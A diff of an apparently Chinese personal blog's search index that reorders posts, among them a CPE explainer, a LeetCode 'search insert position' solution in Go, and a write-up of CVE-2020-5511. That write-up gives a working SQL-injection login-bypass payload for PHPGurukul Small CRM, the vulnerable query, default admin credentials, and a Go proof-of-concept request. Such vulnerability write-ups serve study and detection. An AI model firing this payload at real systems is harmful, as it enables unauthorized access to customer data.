@@ -102,6 +102,115 @@
       </tags>
   </entry>
   <entry>
+    <title>PHPGurukul Small CRM SQL注入漏洞</title>
+    <url>/2021/01/11/CVE-2020-5511/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><hr>
+<h4 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h4><p>PHPGurukul Small CRM是一套客户关系管理系统。</p>
+<hr>
+<p>系统详情</p>
+<p><strong>Language Used</strong>          : PHP</p>
+<p><strong>Database                :</strong> MySQL</p>
+<p><strong>User Interface Design</strong> :PHP 5.6 or above , MYSQL, HTML,CSS, JAVASCRIPT, JQUERY, AJAX</p>
+<p><strong>Web Browser            :</strong> Mozilla, Google Chrome, IE8, OPERA</p>
+<p><strong>Software                :</strong> XAMPP / Wamp / Mamp/ Lamp (anyone)</p>
+<hr>
+<h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>​    系统下载：<a href="https://phpgurukul.com/?smd_process_download=1&amp;download_id=10412">https://phpgurukul.com/?smd_process_download=1&amp;download_id=10412</a></p>
+<p>安装步骤：</p>
+<ol>
+<li><p>下载压缩包文件</p>
+</li>
+<li><p>解压文件拷贝crm 文件夹</p>
+</li>
+<li><p>粘贴到根目录(for xampp xampp/htdocs, for wamp wamp/www, for lamp var/www/html)</p>
+</li>
+<li><p>打开phpmyadmin (<a href="http://localhost/phpmyadmin">http://localhost/phpmyadmin</a>)</p>
+</li>
+<li><p>创建 CRM数据库</p>
+</li>
+<li><p>导入crm.sql(given inside the zip package in SQL file folder)</p>
+</li>
+<li><p>访问 <a href="http://localhost/dfsms">http://localhost/dfsms</a></p>
+</li>
+</ol>
+<p><img src="/img/CVE-2020-5511img/tables.png" alt="tables"></p>
+<hr>
+<h5 id="默认登录密码"><a href="#默认登录密码" class="headerlink" title="默认登录密码"></a>默认登录密码</h5><p><strong>Username:</strong> admin<br><strong>Password:</strong> Test@123</p>
+<p><img src="/img/CVE-2020-5511img/index.png" alt="index"></p>
+<p>能够登录成功说明数据库连接是没有问题的</p>
+<hr>
+<h4 id="CVE-2020-5511"><a href="#CVE-2020-5511" class="headerlink" title="CVE-2020-5511"></a>CVE-2020-5511</h4><h5 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h5><hr>
+<p>漏洞名: PHPGurukul Small CRM SQL注入漏洞</p>
+<p>类型：sql注入</p>
+<p>危险级别：高危</p>
+<p>来源：<a href="https://www.exploit-db.com/exploits/47874">https://www.exploit-db.com/exploits/47874</a></p>
+<hr>
+<p>页面访问</p>
+<p>username：’=’’or  ‘1’ = ‘1’; – -</p>
+<p>**Password：非空任意字符串</p>
+<p><img src="/img/CVE-2020-5511img/index.png" alt="index"></p>
+<hr>
+<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p><strong>admin’ or</strong></p>
+<p>admin后的引号破坏了之前的查询语句，闭合查询语句，注释了后面的内容，or ‘1’ = ‘1’保证了查询逻辑为真</p>
+<p>登录逻辑</p>
+<p><img src="/img/CVE-2020-5511img/loginlogic.png" alt="loginlogic"></p>
+<p>原查询语句：SELECT * FROM user WHERE email=’”.$_POST[‘email’].”‘ and password=’”.$_POST[‘password’].”‘“</p>
+<p>更改为</p>
+<p>SELECT * FROM user WHERE email=’”‘=’’or  ‘1’ = ‘1’; – -“‘ and password=’”a”‘</p>
+<p><img src="/img/CVE-2020-5511img/selectx.png" alt="selectx"></p>
+<p>成功查询到5个用户，用户数量大于0即可绕过登录</p>
+<h5 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h5><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// @Title  PHPGurukul Small CRM SQL注入漏洞</span></span><br><span class="line"><span class="comment">// @Description  PHPGurukul Small CRM SQL注入漏洞poc</span></span><br><span class="line"><span class="comment">// @Author  lennon</span></span><br><span class="line"><span class="comment">// @Update  2021-01-06</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	url := <span class="string">&quot;http://your-ip/crm/index.php&quot;</span></span><br><span class="line">	method := <span class="string">&quot;POST&quot;</span></span><br><span class="line"></span><br><span class="line">	payload := strings.NewReader(<span class="string">`email=%27%3D%27%27or++%271%27+%3D+%271%27%3B+--+-&amp;password=a&amp;login=`</span>)</span><br><span class="line"></span><br><span class="line">	client := &amp;http.Client &#123;</span><br><span class="line">	&#125;</span><br><span class="line">	req, err := http.NewRequest(method, url, payload)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	req.Header.Add(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>)</span><br><span class="line">	req.Header.Add(<span class="string">&quot;Cookie&quot;</span>, <span class="string">&quot;PHPSESSID=b203fa4101b75860a7eccdacf076f177&quot;</span>)</span><br><span class="line"></span><br><span class="line">	res, err := client.Do(req)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> res.Body.Close()</span><br><span class="line"></span><br><span class="line">	body, err := ioutil.ReadAll(res.Body)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> strings.Contains(<span class="keyword">string</span>(body),<span class="string">`window.location.href=&#x27;home.php&#x27;`</span>)&#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;存在CVE-2020-5511漏洞&quot;</span>)</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;未检测到CVE-2020-5511漏洞&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>github:<a href="https://github.com/lennon-liu/vul_check/tree/main/2020/cve-2020-5511/1">–&gt;传送门&lt;–</a></p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Common Platform Enumeration(CPE)</title>
+    <url>/2021/01/11/cpe/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>CPE全称是Common Platform Enumeration，意思是通用平台枚举项。它是NMAP对识别出来的软件、操作系统和硬件的一种命名方式。</p>
+<h3 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h3><p>cpe:/<part>:<vendor>:<product>:<version>:<update>:<edition>:<language></p>
+<ol>
+<li><p>part表示目标类</p>
+<p>a：应用程序</p>
+<p>h：硬件平台</p>
+<p>o：操作系统</p>
+</li>
+<li><p>vendor表示向量类型；</p>
+</li>
+<li><p>product表示产品名称</p>
+</li>
+<li><p>version表示版本号；</p>
+</li>
+<li><p>update表示更新包；</p>
+</li>
+<li><p>edition表示版本；</p>
+</li>
+<li><p>language表示语言项。</p>
+</li>
+</ol>
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>CPE:/o:microsoft:windows_xp:::x86:,CPE:/o:microsoft:windows_vista:::x86:</p>
+<p>part : o 操作系统</p>
+<p>vendor：microsoft</p>
+<p>product ：windows_xp</p>
+<p>version：</p>
+<p>update：</p>
+<p>edition：x86</p>
+<p>language：</p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>基础知识</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hello 2021!</title>
     <url>/2021/01/01/Hello%202021!/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h4 id="置顶"><a href="#置顶" class="headerlink" title="置顶"></a>置顶</h4><p>很庆幸你能看到这篇博客</p>
@@ -221,115 +330,6 @@
       </categories>
       <tags>
         <tag>2021</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PHPGurukul Small CRM SQL注入漏洞</title>
-    <url>/2021/01/11/CVE-2020-5511/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><hr>
-<h4 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h4><p>PHPGurukul Small CRM是一套客户关系管理系统。</p>
-<hr>
-<p>系统详情</p>
-<p><strong>Language Used</strong>          : PHP</p>
-<p><strong>Database                :</strong> MySQL</p>
-<p><strong>User Interface Design</strong> :PHP 5.6 or above , MYSQL, HTML,CSS, JAVASCRIPT, JQUERY, AJAX</p>
-<p><strong>Web Browser            :</strong> Mozilla, Google Chrome, IE8, OPERA</p>
-<p><strong>Software                :</strong> XAMPP / Wamp / Mamp/ Lamp (anyone)</p>
-<hr>
-<h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>​    系统下载：<a href="https://phpgurukul.com/?smd_process_download=1&amp;download_id=10412">https://phpgurukul.com/?smd_process_download=1&amp;download_id=10412</a></p>
-<p>安装步骤：</p>
-<ol>
-<li><p>下载压缩包文件</p>
-</li>
-<li><p>解压文件拷贝crm 文件夹</p>
-</li>
-<li><p>粘贴到根目录(for xampp xampp/htdocs, for wamp wamp/www, for lamp var/www/html)</p>
-</li>
-<li><p>打开phpmyadmin (<a href="http://localhost/phpmyadmin">http://localhost/phpmyadmin</a>)</p>
-</li>
-<li><p>创建 CRM数据库</p>
-</li>
-<li><p>导入crm.sql(given inside the zip package in SQL file folder)</p>
-</li>
-<li><p>访问 <a href="http://localhost/dfsms">http://localhost/dfsms</a></p>
-</li>
-</ol>
-<p><img src="/img/CVE-2020-5511img/tables.png" alt="tables"></p>
-<hr>
-<h5 id="默认登录密码"><a href="#默认登录密码" class="headerlink" title="默认登录密码"></a>默认登录密码</h5><p><strong>Username:</strong> admin<br><strong>Password:</strong> Test@123</p>
-<p><img src="/img/CVE-2020-5511img/index.png" alt="index"></p>
-<p>能够登录成功说明数据库连接是没有问题的</p>
-<hr>
-<h4 id="CVE-2020-5511"><a href="#CVE-2020-5511" class="headerlink" title="CVE-2020-5511"></a>CVE-2020-5511</h4><h5 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h5><hr>
-<p>漏洞名: PHPGurukul Small CRM SQL注入漏洞</p>
-<p>类型：sql注入</p>
-<p>危险级别：高危</p>
-<p>来源：<a href="https://www.exploit-db.com/exploits/47874">https://www.exploit-db.com/exploits/47874</a></p>
-<hr>
-<p>页面访问</p>
-<p>username：’=’’or  ‘1’ = ‘1’; – -</p>
-<p>**Password：非空任意字符串</p>
-<p><img src="/img/CVE-2020-5511img/index.png" alt="index"></p>
-<hr>
-<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p><strong>admin’ or</strong></p>
-<p>admin后的引号破坏了之前的查询语句，闭合查询语句，注释了后面的内容，or ‘1’ = ‘1’保证了查询逻辑为真</p>
-<p>登录逻辑</p>
-<p><img src="/img/CVE-2020-5511img/loginlogic.png" alt="loginlogic"></p>
-<p>原查询语句：SELECT * FROM user WHERE email=’”.$_POST[‘email’].”‘ and password=’”.$_POST[‘password’].”‘“</p>
-<p>更改为</p>
-<p>SELECT * FROM user WHERE email=’”‘=’’or  ‘1’ = ‘1’; – -“‘ and password=’”a”‘</p>
-<p><img src="/img/CVE-2020-5511img/selectx.png" alt="selectx"></p>
-<p>成功查询到5个用户，用户数量大于0即可绕过登录</p>
-<h5 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h5><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// @Title  PHPGurukul Small CRM SQL注入漏洞</span></span><br><span class="line"><span class="comment">// @Description  PHPGurukul Small CRM SQL注入漏洞poc</span></span><br><span class="line"><span class="comment">// @Author  lennon</span></span><br><span class="line"><span class="comment">// @Update  2021-01-06</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	url := <span class="string">&quot;http://your-ip/crm/index.php&quot;</span></span><br><span class="line">	method := <span class="string">&quot;POST&quot;</span></span><br><span class="line"></span><br><span class="line">	payload := strings.NewReader(<span class="string">`email=%27%3D%27%27or++%271%27+%3D+%271%27%3B+--+-&amp;password=a&amp;login=`</span>)</span><br><span class="line"></span><br><span class="line">	client := &amp;http.Client &#123;</span><br><span class="line">	&#125;</span><br><span class="line">	req, err := http.NewRequest(method, url, payload)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	req.Header.Add(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>)</span><br><span class="line">	req.Header.Add(<span class="string">&quot;Cookie&quot;</span>, <span class="string">&quot;PHPSESSID=b203fa4101b75860a7eccdacf076f177&quot;</span>)</span><br><span class="line"></span><br><span class="line">	res, err := client.Do(req)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> res.Body.Close()</span><br><span class="line"></span><br><span class="line">	body, err := ioutil.ReadAll(res.Body)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> strings.Contains(<span class="keyword">string</span>(body),<span class="string">`window.location.href=&#x27;home.php&#x27;`</span>)&#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;存在CVE-2020-5511漏洞&quot;</span>)</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;未检测到CVE-2020-5511漏洞&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<p>github:<a href="https://github.com/lennon-liu/vul_check/tree/main/2020/cve-2020-5511/1">–&gt;传送门&lt;–</a></p>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Common Platform Enumeration(CPE)</title>
-    <url>/2021/01/11/cpe/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>CPE全称是Common Platform Enumeration，意思是通用平台枚举项。它是NMAP对识别出来的软件、操作系统和硬件的一种命名方式。</p>
-<h3 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h3><p>cpe:/<part>:<vendor>:<product>:<version>:<update>:<edition>:<language></p>
-<ol>
-<li><p>part表示目标类</p>
-<p>a：应用程序</p>
-<p>h：硬件平台</p>
-<p>o：操作系统</p>
-</li>
-<li><p>vendor表示向量类型；</p>
-</li>
-<li><p>product表示产品名称</p>
-</li>
-<li><p>version表示版本号；</p>
-</li>
-<li><p>update表示更新包；</p>
-</li>
-<li><p>edition表示版本；</p>
-</li>
-<li><p>language表示语言项。</p>
-</li>
-</ol>
-<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>CPE:/o:microsoft:windows_xp:::x86:,CPE:/o:microsoft:windows_vista:::x86:</p>
-<p>part : o 操作系统</p>
-<p>vendor：microsoft</p>
-<p>product ：windows_xp</p>
-<p>version：</p>
-<p>update：</p>
-<p>edition：x86</p>
-<p>language：</p>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>基础知识</tag>
       </tags>
   </entry>
   <entry>
@@ -453,6 +453,53 @@
       </tags>
   </entry>
   <entry>
+    <title>leetcode题库 35. 搜索插入位置</title>
+    <url>/2021/01/18/leetcode35/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h3 id="leetcode题库-35-搜索插入位置"><a href="#leetcode题库-35-搜索插入位置" class="headerlink" title="leetcode题库 35. 搜索插入位置"></a>leetcode题库 35. 搜索插入位置</h3><hr>
+<h4 id="原题信息"><a href="#原题信息" class="headerlink" title="原题信息"></a>原题信息</h4><hr>
+<h5 id="原题链接"><a href="#原题链接" class="headerlink" title="原题链接:"></a>原题链接:</h5><blockquote>
+<p><a href="https://leetcode-cn.com/problems/search-insert-position/">https://leetcode-cn.com/problems/search-insert-position/</a></p>
+</blockquote>
+<hr>
+<h5 id="难度等级"><a href="#难度等级" class="headerlink" title="难度等级"></a>难度等级</h5><blockquote>
+<p>简单</p>
+</blockquote>
+<hr>
+<h5 id="原题描述"><a href="#原题描述" class="headerlink" title="原题描述"></a>原题描述</h5><blockquote>
+<p>给定一个排序数组和一个目标值，在数组中找到目标值，并返回其索引。如果目标值不存在于数组中，返回它将会被按顺序插入的位置。</p>
+<p>你可以假设数组中无重复元素。</p>
+</blockquote>
+<p><img src="/img/lennon35/example.png" alt="example1"></p>
+<hr>
+<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><hr>
+<h5 id="构思"><a href="#构思" class="headerlink" title="构思"></a>构思</h5><blockquote>
+</blockquote>
+<hr>
+<h5 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h5><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">searchInsert</span><span class="params">(nums []<span class="keyword">int</span>, target <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> i, n <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">for</span> i, n = <span class="keyword">range</span> nums &#123;</span><br><span class="line">		<span class="keyword">if</span> target &lt;= n &#123;</span><br><span class="line">			<span class="keyword">return</span> i</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> i + <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<hr>
+<h5 id="代码链接"><a href="#代码链接" class="headerlink" title="代码链接"></a>代码链接</h5><blockquote>
+<p><a href="https://github.com/lennon-liu/leetcode/tree/main/lennon35">https://github.com/lennon-liu/leetcode/tree/main/lennon35</a></p>
+</blockquote>
+<hr>
+<h4 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h4><p><img src="/img/lennon35/lennon35.png" alt="lennon2"></p>
+<hr>
+<h4 id="优化与总结"><a href="#优化与总结" class="headerlink" title="优化与总结"></a>优化与总结</h4><blockquote>
+</blockquote>
+<hr>
+<blockquote>
+<p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/add-two-numbers">https://leetcode-cn.com/problems/add-two-numbers</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>leetcode</category>
+      </categories>
+      <tags>
+        <tag>golang实现</tag>
+        <tag>简单难度</tag>
+        <tag>数组</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>leetcode题库 66. 加一</title>
     <url>/2021/01/18/leetcode66/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h3 id="leetcode题库-66-加一"><a href="#leetcode题库-66-加一" class="headerlink" title="leetcode题库 66. 加一"></a>leetcode题库 66. 加一</h3><hr>
@@ -486,53 +533,6 @@
 </blockquote>
 <hr>
 <h4 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h4><p><img src="/img/lennon66/lennon66.png" alt="lennon2"></p>
-<hr>
-<h4 id="优化与总结"><a href="#优化与总结" class="headerlink" title="优化与总结"></a>优化与总结</h4><blockquote>
-</blockquote>
-<hr>
-<blockquote>
-<p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/add-two-numbers">https://leetcode-cn.com/problems/add-two-numbers</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>leetcode</category>
-      </categories>
-      <tags>
-        <tag>golang实现</tag>
-        <tag>简单难度</tag>
-        <tag>数组</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>leetcode题库 35. 搜索插入位置</title>
-    <url>/2021/01/18/leetcode35/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h3 id="leetcode题库-35-搜索插入位置"><a href="#leetcode题库-35-搜索插入位置" class="headerlink" title="leetcode题库 35. 搜索插入位置"></a>leetcode题库 35. 搜索插入位置</h3><hr>
-<h4 id="原题信息"><a href="#原题信息" class="headerlink" title="原题信息"></a>原题信息</h4><hr>
-<h5 id="原题链接"><a href="#原题链接" class="headerlink" title="原题链接:"></a>原题链接:</h5><blockquote>
-<p><a href="https://leetcode-cn.com/problems/search-insert-position/">https://leetcode-cn.com/problems/search-insert-position/</a></p>
-</blockquote>
-<hr>
-<h5 id="难度等级"><a href="#难度等级" class="headerlink" title="难度等级"></a>难度等级</h5><blockquote>
-<p>简单</p>
-</blockquote>
-<hr>
-<h5 id="原题描述"><a href="#原题描述" class="headerlink" title="原题描述"></a>原题描述</h5><blockquote>
-<p>给定一个排序数组和一个目标值，在数组中找到目标值，并返回其索引。如果目标值不存在于数组中，返回它将会被按顺序插入的位置。</p>
-<p>你可以假设数组中无重复元素。</p>
-</blockquote>
-<p><img src="/img/lennon35/example.png" alt="example1"></p>
-<hr>
-<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><hr>
-<h5 id="构思"><a href="#构思" class="headerlink" title="构思"></a>构思</h5><blockquote>
-</blockquote>
-<hr>
-<h5 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h5><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">searchInsert</span><span class="params">(nums []<span class="keyword">int</span>, target <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> i, n <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">for</span> i, n = <span class="keyword">range</span> nums &#123;</span><br><span class="line">		<span class="keyword">if</span> target &lt;= n &#123;</span><br><span class="line">			<span class="keyword">return</span> i</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> i + <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<hr>
-<h5 id="代码链接"><a href="#代码链接" class="headerlink" title="代码链接"></a>代码链接</h5><blockquote>
-<p><a href="https://github.com/lennon-liu/leetcode/tree/main/lennon35">https://github.com/lennon-liu/leetcode/tree/main/lennon35</a></p>
-</blockquote>
-<hr>
-<h4 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h4><p><img src="/img/lennon35/lennon35.png" alt="lennon2"></p>
 <hr>
 <h4 id="优化与总结"><a href="#优化与总结" class="headerlink" title="优化与总结"></a>优化与总结</h4><blockquote>
 </blockquote>
